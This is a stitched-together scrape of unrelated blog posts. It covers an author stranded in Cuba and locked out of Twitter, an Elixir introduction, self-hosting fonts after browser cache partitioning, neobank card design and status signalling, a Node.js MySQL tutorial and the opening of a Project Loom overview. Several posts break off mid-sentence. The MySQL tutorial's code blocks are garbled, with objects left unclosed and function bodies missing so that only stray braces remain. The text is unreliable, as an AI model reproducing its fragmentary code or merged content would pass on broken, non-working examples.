  <p>There was a lot to figure out over the ensuing <em>month</em> of my ordeal - money, lodging, language barriers, administrative hurdles. My family and friends hit the panic button for me and my case reached the ears of both Arlen Specter on the US Senate Foreign Relations Committee and George Yeo, the Singapore Foreign Affairs Minister. We eventually worked it out, but every night for 4 weeks I would wander up and down <a href="https://en.wikipedia.org/wiki/Malec%C3%B3n,_Havana">the Malecón</a>, listening to the crashing waves, not knowing when I could ever leave the country. If I could swim <a href="https://en.wikipedia.org/wiki/Southernmost_point_buoy">the 90 miles to Key West</a> and <a href="https://en.wikipedia.org/wiki/Wet_feet,_dry_feet_policy">dry my feet</a>, I might theoretically make it back to the US on my own.</p>
  <p>
    <img src="https://dev-to-uploads.s3.amazonaws.com/i/3i8nh2cgaoj3jlrl9ecm.jpg" alt="Alt Text">
  </p>
  <p>But most of all, I thought a lot about <strong>the humanity of having a piece of paper be more important than the human it represents</strong>. I could be physically standing in front of the immigration officer with a lie detector test on and steadfastly stating all manner of provable personal detail, and they would not let me through unless I had a small piece of paper the size of my hand.</p>
  <p>We do this a lot - passports, voter registration cards, national ID systems, licenses, and insurance proofs - mostly because some humans are untrustworthy and try to exploit the system.</p>
  <p>But we often fail to design for people who are innocent and simply don't fit the system in some way.</p>
</section>
<section>
  <h2 id="the-consequences-of-not-being-provably-human"><a href="#the-consequences-of-not-being-provably-human">The Consequences of Not Being Provably Human</a></h2>
  <p>Twitter has a way in which they expect you to verify you are human - you should get a call or text message with a code, that you then enter to prove humanity. This is what I normally get (about once every 1-2 months), and I can receive text messages from Twitter, so I can usually prove humanity with no issue.</p>
  <p>This time, for some reason, I am on a code path that doesn't offer a text message option, and Twitter somehow doesn't make international US number calls, leading to this infinite loop that I think is a bug:</p>
  
  <p>As a result of this unfortunate design:</p>
  <ul>
    <li>My friends think I mass unfollowed them, because Twitter temporarily reduced my follow count to 0</li>
    <li>People who DM me think I am ignoring them, because Twitter doesn't inform them that I am currently locked out</li>
    <li>None of my past tweets show up at all in <a href="https://twitter.com/search?q=from%3Aswyx&amp;src=typed_query">Twitter search</a>, which is problematic because I <a href="https://twitter.com/swyx/status/1245281982797373441?lang=en">use Twitter as a Second Brain</a>. If you read any of my blogposts, you will see that the rich link density of my references mainly come from taking notes in public over an extended period of time.</li>
    <li>I was unable to engage in the normal personal and professional activity I would do during Black Friday and AWS Re:invent</li>
  </ul>
  <p>I've filed a support ticket with Twitter, but you can imagine that support for a 330 million user service isn't very responsive. People who have been through this tell me the only way to resolve it is to hit up a Twitter employee to get past the masses of unrelated and less urgent support issues.</p>
</section>
<section>
  <h2 id="humans-proving-humanity-to-machines"><a href="#humans-proving-humanity-to-machines">Humans Proving Humanity To Machines</a></h2>
  <p>In the grand scheme of things, I know this is minor. I've actually taken it as a welcome social media detox, which I usually take voluntarily in December anyways. But when it's not on my terms, I lose the ability to manage the personal and professional relationships I've painstakingly built up over the past 3-4 years.</p>
  <p>Above all, I think there's an <em>indignity</em> in humans having to prove to machines that they are human, and the error resolution mechanism is to send a ticket to a faceless and unresponsive support email, and the only real way to get around it is again to re-establish human connections.</p>
  <p>I think more about all the other ways that we as software developers and designers fail to honor the dignity of humans trying to interact with the systems we create.</p>
  <p><a href="https://www.theverge.com/2019/2/1/18205610/google-captcha-ai-robot-human-difficult-artificial-intelligence">In 2014</a>, Google pitted one of its machine learning algorithms against humans in solving the most distorted text CAPTCHAs: the computer got the test right 99.8 percent of the time, while the humans got a mere 33 percent. It doesn't impact everyone equally - if you as a sighted, able bodied user struggle with CAPTCHAs, imagine the elderly or differently abled. Most services do not offer any alternative resolution when you cannot prove you are human. This is a problem when your service has essentially killed off the offline alternative and is essential for their basic needs.</p>
  <p>In Eric Meyer's <a href="https://meyerweb.com/eric/thoughts/2016/01/25/designing-for-crisis-design-for-real-life/">Designing for Crisis</a>, he describes how an inaccessible hospital website nearly risked the life of his daughter. I shudder to think how it might be made worse by perfectly well meaning software engineers who don't think about the humanity of the failure path. Imagine if you had to log in to something to save your child's life, and it presented you with a CAPTCHA you couldn't pass.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section><p>Today I want to give you an introduction to the programming language Elixir, some of its features and why you might want to check it out!</p>
</section><article><section><h2>The basics</h2>
<p>First things first: Elixir is a concurrent functional language that runs on the Erlang VM. It is inspired by many different languages where Ruby and Erlang are most obvious ones based on the syntax.</p>
<p>Elixir is a <a href="https://thinkingelixir.com/elixir-in-the-type-system-quadrant/">strong, dynamically typed language</a>. This puts it in the same category as Ruby and Python and it has optional functionality for compile time type checking as well.Elixirs data structures are immutable, but variables can be reassigned/rebound. <sup><sup id="fnref-2"><a href="#fn-2">2</a></sup></sup> This was a bit strange for me in that I got started with FP through Elm where there are no variables, just constants.</p>
<p>Elixir inherits a lot its data structures and related syntax from Erlang which in many ways is its biggest influence. <a href="https://elixir-lang.org/blog/2013/08/08/elixir-design-goals/">Elixir Design Goals</a> describes the relation to Erlang like this:</p>
<blockquote>
<p>Elixir is meant to be compatible with the Erlang VM and the existing ecosystem. When we talk about Erlang, we can break it into three parts:</p>
<ul>
<li>A functional programming language, called Erlang</li>
<li>A set of design principles, called OTP (Open Telecom Plaform)</li>
<li>The Erlang Virtual Machine, referred to as EVM or BEAM</li>
</ul>
<p>Elixir runs in the same virtual machine and is compatible with OTP. Not only that, all the tools and libraries available in the Erlang ecosystem are also available in Elixir, simply because there is no conversion cost from calling Erlang from Elixir and vice-versa.</p>
</blockquote>
<p>This is a great feature of Elixir that we will talk more about later.</p>
<p>As for other inspirations Elixir has docstrings from Python, polymorphism and protocols from Clojure, macros and meta-programming from different Lisps, just to name a few. <sup><sup id="fnref-1"><a href="#fn-1">1</a></sup></sup></p>
<h3>Hello World!</h3>
<p>As I said, Elixir is a concurrent functional programming language. For the functional part it means that Elixir mainly uses functions and modules for code structure and has other features that are associated with functional languages. We'll talk about the concurrent part later. </p>
<p>A hello world example in Elixir might look something like this:</p>
<div data-language="elixir"><pre><code><span>defmodule</span> HelloWorld
  <span>def</span> hello_world <span>do</span>
    IO<span>.</span>puts<span>(</span><span>"Hello, World!"</span><span>)</span>
  <span>end</span>
<span>end</span></code></pre></div>
<p>Here we define a module with a function that simply writes "Hello, World!" to the console.</p>
<h2>Killer applications</h2>
<p>Many programming languages has <a href="https://en.wikipedia.org/wiki/Killer_application">"killer apps"</a>; libraries, frameworks and use cases, that in themself are enough to justify the transition to the language or try it out. For Ruby it was the web framework Ruby on Rails and in many ways Elixir has its own Rails: Phoenix.</p>
<h3>Phoenix web framework</h3>
<p><a href="https://www.phoenixframework.org/">Phoenix</a> is inspired by Rails (the team originally behind Elixir was previously a Ruby shop) and was an early addition to the Elixir community. The creators of Phoenix has learned from years of Rails development and made their own opinions in addition to the natural changes needed when going from an object oriented language to a functional language.
Compared to Rails Phoenix has with the help of the Erlang VM great performance. Some of you might have heard about Phoenix' amazing <a href="https://www.phoenixframework.org/blog/the-road-to-2-million-websocket-connections">2 million simultaneous web sockets</a> benchmark!</p>
<h3>The Nerves Project</h3>
<p>Another interesting project in the Elixir ecosystem is the embedded/IoT project <a href="https://www.nerves-project.org/">Nerves</a>. Nerves makes it possible to use Elixir code to create embedded system where previously you would have had to use a low level language like C. This does not stop you from bringing your own code (like C, C++, Python, Rust, and more) while using Nerves as a platform for your IoT project.
The project web site says:</p>
<blockquote>
<p>Nerves is a complete IoT platform and infrastructure for you to build and deploy maintainable embedded systems.</p>
</blockquote>
<h2>The BEAM and OTP</h2>
<p>When talking about the advantages of Elixir it is hard to not talk about the advantages of Erlang and its virtual machine, the BEAM (Bogdan's Erlang Abstract Machine). It is in many ways the biggest selling point for Elixir. We are now talking about the concurrent part of Elixir. Erlang and the BEAM has shown its resiliency over many years, exemplified in giving Ericsson 9 nines (99.9999999%) availability in their AXD301 switch.<sup><sup id="fnref-3"><a href="#fn-3">3</a></sup></sup> It is known for its "let it break" philosophy and self-healing properties and by being compatible with Erlang, Elixir inherits a lot of these traits.</p>
<p>Elixirs creator, Jose Valim, attributes one of the motivational factors for the creation of Elixir to the rise of multi-core CPUs and the need to utilize these. Ruby and other languages with a global interperter lock (GIL) limits this, but the Erlang VM and the tools and design prinsiples of OTP have proven to be a great choice for creating concurrent, performant and resilient applications.</p>
<h3>Everything is a process</h3>
<p>Everything in the BEAM is a process. These are not OS processes, but lightweight processes which can be cheaply spawned and killed. In his PhD thesis the co-inventor of Erlang, Joe Armstrong, summarized Erlangs principles regarding processes:</p>
<blockquote>
<ul>
<li>Everything is a process.</li>
<li>Processes are strongly isolated.</li>
<li>Process creation and destruction is a lightweight operation.</li>
<li>Message passing is the only way for processes to interact.</li>
<li>Processes have unique names.</li>
<li>If you know the name of a process you can send it a message.</li>
<li>Processes share no resources.</li>
<li>Error handling is non-local.</li>
<li>Processes do what they are supposed to do or fail.</li>
</ul>
</blockquote>
<p>Sidenote: For some this may sound vaguely familiar. Some object oriented languages has had similar principles, but instead of processes they are applied to objects. Smalltalk is reported to be one of the inspirations to Erlang and it is fun to think about Erlang being a functional language but still be more object oriented than some object oriented languages. This is of course not the case as the definition of OOP has changed over time and Erlang is a functional language, but it is fun to ponder the similarities. 😄 Back to the main story! 😅</p>
<p>These unique principles for processes where they communicate through messages lays a great foundation for creating concurrent application, but there is one more piece to the puzzle: OTP.</p>
<h3>OTP - The Open Telecom Platform</h3>
<p>As with so many other parts of this article OTP is a big topic and could be a separate article, but I'll try make it short! Today the name is a bit strange but it was created by Ericsson for their telephone switches in the 80s and 90s so in that context in makes more sense.</p>
<p>OTP is an integral part of many Erlang applications. In essence OTP is a set of design principles and standards including tools and libraries to make it easier to create applications that adheres to them.<sup><sup id="fnref-4"><a href="#fn-4">4</a></sup></sup> </p>
<p>Since Elixir is compatible with OTP we can leverage these principles and technologies that has been battle tested in high-pressure and critical applications for decades!</p>
<h2>The take-away</h2>
<p>Luckily you don't need to understand or know much about Erlang, BEAM and OTP.
Without deep knowledge of these topics you can still reap the benefits of highly performing web applications and resilient IoT applications. It would certainly help but it is not a prerequisite. This is the great thing about Elixir: it is an approachable language with battle tested underpinnings! 💪</p>
<p>It might not be your idea of a perfect language. It is not mine either, but that does not stop me from using the great tools at my disposal. If you are all into Haskell or the likes it might not be something you would use and that is OK. Whatever your preferences are you might now know a little more about Elixir and Erlang and some more knowledge is always a good thing. 😄</p>
<p>If you would like to check Elixir out I recommend checking out <a href="https://elixir-lang.org/getting-started/introduction.html">the official Getting started guide</a> or the interactive guide <a href="https://try-elixir.herokuapp.com/">Try Elixir</a> and then trying out a project with Phoenix or Nerves. Hands-on experience is always better than something you read on the internet! 🤓</p>
<p>Psst! By the way: there are other languages that run on the BEAM. <a href="https://lfe.io/">Lisp variants</a> and lately some work on <a href="https://gleam.run/">strong statically compiled ML-like languges</a> if you are into that!</p>

<p>This is nothing new. In fact it’s been advocated already for years. Even Google themselves <a href="https://www.youtube.com/watch?v=Mv-l3-tJgGk&amp;feature=youtu.be&amp;t=24m58s">advised others to self-host fonts</a> in their Google I/O ‘18 talk about web performance.</p>
<h2 id="self-hosting-fonts-vs-google-fonts">Self-hosting fonts vs Google Fonts</h2>
<p>By nature Google Fonts, even with all its font and CSS optimisations, can’t be faster than self-hosted fonts.</p>
<p>Sia wrote <a href="https://medium.com/clio-calliope/making-google-fonts-faster-aadf3c02a36d">a great post</a> where she compared the performance between Google Fonts and self-hosted fonts without the impact of a CDN.</p>

<h2 id="the-old-performance-argument">The old performance argument</h2>
<p>So if the bottom-line performance is in self-hosting fonts’ favour: What was the argument that convinced us developers that Google Fonts is at least as performing as the self-host approach?</p>
<p>Google Fonts was designed to be distributed on a global CDN and reap the caching benefits from it. Users request fonts via said CDN. Chances are that they have downloaded the font resources at an earlier point already from a different site.</p>
<blockquote>
<p>“[…] Our cross-site caching is designed so that you only need to load a font once, with any website, and we’ll use that same cached font on any other website that uses Google Fonts.”</p>
<p>— <a href="https://fonts.google.com/about">https://fonts.google.com/about</a></p>
</blockquote>
<h2 id="invalidating-the-old-performance-argument">Invalidating the old performance argument</h2>
<p>Since Chrome v86, released October 2020, cross-site resources like fonts can’t be shared on the same CDN anymore. This is due to the partitioned browser cache (Safari has had this for years already).</p>
<p>In <a href="https://developers.google.com/web/updates/2020/10/http-cache-partitioning">this Google post</a> they explain what the partitioned browser cache is. It got only introduced to prevent a possible cross-site tracking mechanism.</p>
<h2 id="cache-partitioning-in-other-browsers">Cache partitioning in other browsers</h2>
<p>Safari really cares about privacy. It circumvented this very cross-site tracking attack for years already. Then finally comes Chrome. Other browsers that are based off Chromium, still need to signal or implement the feature.</p>
<ul>
<li>✅ <strong>Chrome</strong>: since v86 (October 2020)</li>
<li>✅ <strong>Safari</strong>: since 2013</li>
<li>🚫 <strong>Firefox</strong>: planning to implement</li>
<li>🚫 <strong>Edge</strong>: most likely soon</li>
<li>🚫 <strong>Opera</strong>: most likely soon</li>
<li>🚫 <strong>Brave</strong>: most likely soon</li>
<li>🚫 <strong>Vivaldi</strong>: most likely soon</li>
</ul>
<h2 id="conclusion">Conclusion</h2>
<p>Google Fonts resources will be redownloaded for every website, regardless it being cached on the CDN. Self-host your fonts for better performance. The old performance argument is not valid anymore.</p>
<p>Thanks for checking this post out!</p>

<h3>How Neobanks Should Monetize Status Signaling</h3>



<p><span>01</span> Intro</p>



<p>If you’ve been following this blog for a while, you probably know by now that one of my favorite topics to think and write about is “status signaling”.</p>



<p>Signaling explains most of our everyday actions: what clothes we wear, which universities we pick and which religion we subscribe to. Everything has a hidden signaling component with which we communicate our desired tribal affiliation.</p>



<p>In <a href="http://julian.digital/2020/03/28/signaling-as-a-service/">Signaling-as-a-Service</a>, I described the implications signaling has on the monetization of software businesses. For many traditional industries, monetizing the display of status is not a new concept. A Rolex watch, for example, is not better at telling the time than a cheap Casio watch. But a Rolex reveals something about its owners’ wealth and, thus, their status in society. It’s that status message that explains the difference in price.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/equaltime.png"></p><p>Similarly, driving a Prius says something about your views on climate change. A <em>Make America Great Again</em> cap reveals something about your political affiliations. And Nike athletic wear signals a healthy, pro-active lifestyle.</p>



<p>Software is at a crucial disadvantage compared to these physical products because of its intangibility. A fitness app also signals a healthy, pro-active lifestyle, but no one can see it because it only lives on your phone. Everyone can see your Nike gear whenever you wear it in public. Software can’t offer the same benefit. It doesn’t have a signaling distribution channel.</p>



<p>This is why there is no software equivalent of a Rolex watch or a Louis Vuitton handbag. People aren’t willing to spend money on things other people can’t see they spent money on.</p>



<p>But it doesn’t have to be that way. As software is eating the world, the lines between physical and digital products are becoming increasingly blurry. As I have pointed out in my original essay, one way for software companies to solve the signaling distribution problem is to add a physical element to their software product.</p>



<p>In this post I want to explore this idea a little bit further. Specifically, we’ll look at neobanks – and their opportunity to monetize credit card signaling.</p>



<p><span>02</span> Neobanks</p>



<p>In the last couple of years we have witnessed the birth and rise of a new startup vertical: neobanks.</p>



<p>Neobanks differ from traditional banks in two ways:</p>



<p>1) Rather than relying on a physical branch network, the entire banking experience is managed via an app</p>



<p>2) Instead of the <a href="https://www.youtube.com/watch?v=C-q4bEULG64">“how do you do, fellow kids”</a>-cringiness that ad campaigns of traditional banks usually invoke when they try to appeal to a younger audience, neobanks are actually perceived as cool. In fact, many of them feel more like lifestyle brands than banks or tech companies.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/12/1_26qGBSGmB3yaPD7nZJrFIg.gif">



<img src="https://julian.digital/wp-content/uploads/2020/12/lifestylebrand-1.png"></p><p>Interestingly though, neobanks still use one very traditional banking element: physical cards.</p>



<p>At first glance, this might seem counterintuitive. If you are building a mobile-first bank, why not offer virtual cards and let users pay with their phone? Why go through the hassle of producing and shipping physical cards?</p>



<p>The answer is – you guessed it – signaling.</p>



<p>Think about it: Paying for things (offline) is a social activity. It’s an interaction between at least you and a cashier or waiter. But ideally, in a dinner scenario for example, you are surrounded by other people you want to impress: a date, a group of friends, or work colleagues.</p>



<p>This makes the moment you take out your card to pay the bill a great opportunity to make a statement and build social capital.</p>



<p>If you look at neobanks out there today, it’s pretty obvious that signaling is in fact one of the main benefits they offer – and almost the only thing they monetize <span>(apart from interchange, of course)</span>:</p>



<ul><li>The premium subscriptions neobanks offer usually don’t win on features but solely on nicer looking cards. The <a href="https://n26.com/metal">N26</a> or <a href="https://revolut.com/metal">Revolut</a> Metal plans, for example, don’t offer any additional features that <em>really</em> justify the ~€15 / month price tag. They do include a nice looking metal card though – that’s what people pay for.</li><li>Relatedly, it seems like most of the innovation in the industry is happening in card design. The actual banking products are more or less interchangeable, what differs is whether the card comes in <a href="https://www.apple.com/apple-card/">titanium</a>, <a href="https://www.treecard.org/">wood</a>, or <a href="https://twitter.com/cashapp/status/1290694734529400832">glow-in-the-dark yellow</a>.</li><li>You may have noticed that the credit card number has moved from the front to the back of the card. This makes it easier for users to share photos of their cards on social media as an additional signaling distribution channel.</li></ul>



<p><img src="https://julian.digital/wp-content/uploads/2020/11/nocardnumber-1.png"></p><p>Neobanks are popping up like mushrooms after the rain at the moment and it’s unlikely that this trend will end any time soon. Thanks to banking-as-a-service providers, we’ll likely see a lot of non-banking-companies add banking functionalities and cards to their product offering.</p>



<p>There’s an old Twitter joke that every app evolves until it eventually becomes a chat app. The 2020 version of that joke is that every app evolves until it eventually becomes a bank.</p>



<p>When <a href="https://twitter.com/lehrjulian/status/1295024066869567488">I did some research on credit card designs</a> recently, I was surprised by the sheer amount of different neobanks already in existance. And yet, even though almost all of them offer well-designed cards, it’s shocking how similar they all are. It seems like all of them are focusing on the same target audience instead of differentiating their signaling messages.</p>



<p>Let me explain.</p>



<p><span>03</span> In-Groups, Out-Groups and Artificial Scarcity</p>



<p>In every signaling scenario there are two possible target audiences: An in-group and an out-group.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/groups.png"></p><p>The in-group is the tribe you want to join and signal your affiliation to. The out-group is everyone else – people you want to distance yourself from.</p>



<p><a href="https://www.fastcompany.com/90391587/why-we-dont-want-you-and-your-android-green-bubbles-in-our-imessage-chat">iMessage is a great illustration of this</a>: the chat bubble colors clearly indicate who belongs to the in-group (blue = iOS) and who is part of the out-group (green = Android). </p>



<p>It’s important to note that signaling in iMessage is limited to the in-group since these color codes are only visible for iOS users – Android users can’t see who in the group is using which operating system. </p>



<p>Signaling, however, grows stronger the larger the out-group is – as long as the out-group knows about the in-group. This is why luxury car manufacturers deliberately extend their advertising campaigns to people who will never be able to afford their cars: they are increasing the size of the out-group by educating people about the in-group.</p>



<p>At the same time, brands need to control the size of the in-group. The more exclusive the in-group, the higher the signaling strength and, thus, the monetization potential of a customer. </p>



<p>The easiest control mechanism for the size of the in-group is price. If you set the price high enough, few people will be able to afford the product. Ironically, this, in turn, justifies the high price.</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/priceloop.png"></p><p>Alternatively, companies create artificial scarcity by setting a hard number on supply. Limited supply creates FOMO and hype which increases the size of the out-group and results in higher social status for members of the in-group. Artificial scarcity explains the price of Bitcoin, Pokémon trading cards and why people spend hours queuing in front of Supreme shops.</p>



<p>The problem with keeping the in-group small is that it also limits the number of potential customers and, thus, overall revenue potential. Companies need to walk a fine line between maximizing the number of customers while simultaneously maximizing the number of people they can (afford to) exclude.</p>



<p><span>04</span> What Neobanks Should Build</p>



<p>The problem with neobanks today is that they all focus on the same in-group. Here are the premium cards of some of the largest European challenger banks – notice any difference?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/metalcards.png"></p><p>It seems like everyone is trying to become the Apple of Banking – including <a href="https://www.apple.com/apple-card/">Apple itself</a>. The signaling messages are all about displaying economic power.</p>



<p>But we are slowly seeing new banking apps that are focusing on different audiences. For example, there are now a <a href="https://www.tomorrow.one/">handful of</a> <a href="https://blog.gohenry.com/uk/gohenry-news/meet-our-new-biodegradable-eco-card/">“green”</a> <a href="https://www.treecard.org/">neobanks</a> that help users signal environmental altruism. </p>



<p>Or how about <a href="https://www.razer.com/razer-card">this Razer Card</a> targeted at the gamer community?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/12/environment.png"></p><p>The question for these companies and their investors is whether the in-group is big enough to justify building an entire bank around it. Making the unit economics of a bank work requires a certain amount of users, but as we discussed earlier, the signaling strength decreases as the size of in-group increases.</p>



<p>So how do you solve this problem?<br>By introducing multiple in-groups.</p>



<p>See, the current model looks like this:</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/neogroup01.png"></p><p>(In fact, given how undifferentiated most of the offerings and cards are, there are actually multiple neobanks within the same small in-group bubble.)</p>



<p>But what if one bank would target multiple, different in-groups?</p>



<p><img src="https://julian.digital/wp-content/uploads/2020/10/neogroup02.png"></p><p>For example, what if N26 had dedicated cards for soccer fans, hip-hop enthusiasts and gamers? Instead of focusing on just one signaling audience, their total addressable market would massively increase. </p>



<p>The way they would target these audiences is via brand collaborations. N26 does not have the necessary reputation in any of the above-mentioned areas to build credible signaling messages. It would not be able to build attractive in-groups on its own – but other brands could lend N26 their social capital. </p>



<p>Apple has long worked with <a href="https://www.apple.com/lae/product-red/">RED</a>, IKEA recently <a href="https://www.highsnobiety.com/p/virgil-abloh-ikea-collaboration-best-look/">teamed up with Virgil Abloh</a>, and <a href="https://www.headspace.com/partners/nike-partnerships">Nike partners with Headspace</a>. Why wouldn’t this concept work for neobanks?</p>



<p>What would <strong>N26 x Manchester United</strong> look like? <br>Or <strong>Chime x Supreme</strong>? <br>Or <strong>Revolut x 100 Thieves</strong>?</p>



<p>Because of a bigger target audience overall, individual in-groups could be kept smaller. Cards could be <a href="https://thegeneralist.substack.com/p/scarcity-as-an-api">released as limited edition drops</a> transforming them into collectibles, which would justify a higher price tag per card.</p>



<p>It’s worth noting that different signaling audiences are not mutually exclusive. We don’t just subscribe to a single in-group – our <a href="http://julian.digital/2020/09/25/is-this-real-life/">identities are prismatic</a>. This means that some users might …</p></div></div>

<article><p>Everybody is talking about NoSQL, especially in the NodeJS world. Lot’s of people
even associate Node with Mongo and other NoSQL databases.</p>
<p>However, the world doesn’t end there. SQL databases like MySQL, PostgreSQL, Oracle
or even SQL Server are battle tested in all kind of scenarios. Companies both
large and small use them to run their mission critical systems.</p>
<p>Moreover, if you are already comfortable with MySQL, Postrgres or any other
there is not reason to switch to another database.</p>
<p>Often, it’s better to use what you know and what you love, instead of changing to
another technology for promises that might never materialize.</p>
<p>Actually, even though the last few years people talk mostly about NoSQL, most of
the web apps that you encounter today are still running on SQL databases. The most
popular of which is still MySQL.</p>
<p>Unfortunately, many people take for granted that Node should be used with a
NoSQL database and that is why we are not hearing what can be done with SQL.</p>
<p>Let’s have a look what we can do with MySQL.</p>
<h3 id="connecting-to-mysql">Connecting to MySQL</h3>
<p>Before you do anything, you need to install the right NPM package.</p>
<figure><pre><code data-lang="bash"><span>$ </span>npm <span>install </span>mysql</code></pre></figure>
<p><strong>mysql</strong> is a great module which makes working with MySQL very easy and it provides
all the capabilities you might need.</p>
<p>Once you have <strong>mysql</strong> installed, all you have to do to connect to your database
is</p>
<figure><pre><code data-lang="js"><span>var</span> <span>mysql</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>mysql</span><span>'</span><span>)</span>

<span>var</span> <span>connection</span> <span>=</span> <span>mysql</span><span>.</span><span>createConnection</span><span>({</span>
  <span>host</span><span>:</span> <span>'</span><span>localhost</span><span>'</span><span>,</span>
  <span>user</span><span>:</span> <span>'</span><span>your_user</span><span>'</span><span>,</span>
  <span>password</span><span>:</span> <span>'</span><span>some_secret</span><span>'</span><span>,</span>

<p>First, you connect to the database, then you insert one record and then
you read it back.</p>
<p>You can also see that <strong>?</strong> acts as placeholders for your values. It not only makes
using values easier but it also escapes them so that your queries are always safe.</p>

we created a separate file <strong>db.js</strong> to help us manage our connections.</p>
<p>Let’s look how your helper <strong>db.js</strong> file will look like when using MySQL instead
of Mongo. Its purpose is to have easy access to the database whenever you need it
without constantly entering credentials.</p>
<p>Its second goal is to make it easy to run tests which access your database.</p>

<p>This <strong>db.js</strong> file is a little bit more complicated than what we did before.</p>
<p>First, it provides a way to connect to the database. When you connect you can do
it either in production mode or in test mode. Test mode is for only when running
automated tests.</p>
<p>Then there is a get method which can always provide you with an active connection, which
you can use to query the database.</p>
<p>So whenever you need to contact the database instead of setting up database
passwords and other arguments you just call this method and you are ready to go.</p>
<p>Finally, there are two more methods <strong>fixtures</strong> and <strong>drop</strong>, which exist to
make your life easier when testing.</p>
<p><strong>drop</strong> clears the data, but not the schemas from all the tables that you want.
It will help you to be sure that your test database is always clean before every
test.</p>
<p><strong>fixtures</strong> takes a JSON object and loads its data into the database, so that there
is something on which to run your tests. Let’s have a quick look how it looks
to work with it:</p>
<figure><pre><code data-lang="js"><span>var</span> <span>data</span> <span>=</span> <span>{</span>

<p>It is very simple to use, and after running it your tables <em>cars</em> and <em>people</em>
will have data in them.</p>
<h3 id="building-models-with-sql">Building models with SQL</h3>
<p>Everything is in place and the next step is to actually see how you are going
to use <strong>db.js</strong> so that it will make your life easier.</p>
<p>Let’s have an example app with the following structure</p>
<figure><pre><code data-lang="bash">controllers/
  comments.js
  users.js
models/
  comment.js
  user.js
views/
app.js
db.js
package.json</code></pre></figure>
<p><strong>app.js</strong> is the entrypoint of the application and this is the place where we
are going to setup the database connection. Let’s have a look what is inside it.</p>
<figure><pre><code data-lang="js"><span>var</span> <span>db</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>./db</span><span>'</span><span>)</span>

    <span>})</span>
  <span>}</span>
<span>})</span></code></pre></figure>
<p>Your app will interact with the database through its models. So let’s have a look
how a model can look like. For example this is how your comments model can look
like:</p>
<figure><pre><code data-lang="js"><span>var</span> <span>db</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>../db.js</span><span>'</span><span>)</span>

  <span>})</span>
<span>}</span>

    <span>done</span><span>(</span><span>null</span><span>,</span> <span>rows</span><span>)</span>
  <span>})</span>
<span>}</span>

<span>exports</span><span>.</span><span>getAllByUser</span> <span>=</span> <span>function</span><span>(</span><span>userId</span><span>,</span> <span>done</span><span>)</span> <span>{</span>

    <span>done</span><span>(</span><span>null</span><span>,</span> <span>rows</span><span>)</span>
  <span>})</span>
<span>}</span></code></pre></figure>
<p>As you can see the <strong>db.js</strong> files makes it very easy to build any kind of models
without worrying about connecting the database. It doesn’t even know whether you
are in production or testing mode, so your models will work in both cases.</p>
<p>Then you can use your newly built models in your controllers and they won’t even
know that there is a SQL solution behind.</p>
<h3 id="advanced-usage-using-different-database-instance-for-reading-and-writing">Advanced usage: using different database instance for reading and writing</h3>
<p>As your app grow your needs grow. Many of todays applications are read orientied.</p>
<p>That means that people write data more rarely than they read. For example, all
social networks are this type of applications. Usually a status is written once
but then read by hundreds or even thousands of people.</p>
<p>In this kind of situations it makes sense to have one main database which will
accept all the writes and then synced to a few more MySQL instances which will
serve only the read requests.</p>
<p>Then when you have more users you can easily add more database only for reading
and your app will scale and still be super fast.</p>
<p>But how can this work in our setup from above?</p>
<p>The <strong>mysql</strong> module has the very useful PoolCluster feature, which can take the
configurations for several instances and then connect to all of them. Let’s see
how your <strong>db.js</strong> file will look:</p>
<figure><pre><code data-lang="js"><span>var</span> <span>mysql</span> <span>=</span> <span>require</span><span>(</span><span>'</span><span>mysql</span><span>'</span><span>)</span>

<h2>Why Loom?</h2>
<p>In 1998, it was amazing that the Sun Java Web Server (the precursor of Tomcat) ran each request in a separate thread, and not an OS process. It was able to serve thousands of concurrent requests this way! Nowadays, that’s not so amazing. Each thread takes up a significant amount of memory, and you can’t have millions of threads on a typical server.</p>
<p>That’s why the modern mantra of server-side programming is: “Never block!” Instead, you specify what should happen once the data is available.</p>
<p>This asynchronous programming style is great for servers, allowing them to handily support millions of concurrent requests. It isn’t so great for programmers.</p>
<p>Here is an asynchronous request with the <code>HttpClient</code> API:</p>
<pre>HttpClient.newBuilder()
   .build()
   .sendAsync(request, HttpResponse.BodyHandlers.ofString())
   .thenAccept(response -&gt; . . .);
   .thenApply(. . .);
   .exceptionally(. . .);
</pre>
<p>What we would normally achieve with statements is now encoded as method calls. If we loved this style of programming, we would not have statements in our programming language and merrily code in Lisp.</p>
<p>In JavaScript, code tagged as “async” is rewritten into method calls like the ones that you’ve just seen. But that means you can only call async methods from other async methods, and your API splits into a sync and an async part, forcing you to duplicate functionality.</p>

<p>Project Loom takes its guidance from languages such as Erlang and Go, attacking the root of the problem by making blocking very cheap. You run tasks in “virtual threads”, a nearly unlimited resource that is mapped into actual “carrier” threads. When a virtual thread blocks, it is “parked” and another virtual thread runs on the carrier thread. The name is supposed to remind you of virtual memory that is mapped to actual RAM.</p>
<p>Before you complain about the name, remember that naming is hard. The Loom team previously tried “fiber”, but it is already used elsewhere with a slightly different meaning. And “lightweight” or “new” thread might look foolish when something lighter-weight or newer comes along.</p>
<p>After experimenting with separate classes for OS threads and virtual threads, they ended up deciding to use a single class for both—the familiar <code>java.lang.Thread</code>—in order to ease migration.</p>
<p>Of course, good old <code>java.lang.Thread</code>, which has been around for 25 years, ever since Java 1.0, has its share of cruft. Awkward cancellation, thread groups, priorities, depreceated methods <code>stop</code>,<code>suspend</code>, <code>resume</code>. The Loom team felt that these liabilities were minor since most programmers never explicitly use the <code>Thread</code> API but launch tasks with an <code>ExecutorService</code>. (Of course, the same argument would support coming up with a cleaner virtual thread API instead.)</p>
<p>If you have been around for a very long time, you may remember that early versions of Java had “green threads” that were mapped to an OS thread. However, there is a crucial difference. When a green thread blocked, its carrier thread was also blocked, preventing all other green threads from making progress.</p>

<p>You can download binaries of Project Loom at <a href="http://jdk.java.net/loom/">http://jdk.java.net/loom/</a>. They are updated regularly.</p>
<p>As already mentioned, a virtual thread is an object of the <code>Thread</code> class. Here are three ways of producing fibers. First, there is a new factory method that constructs and starts a virtual thread:</p>
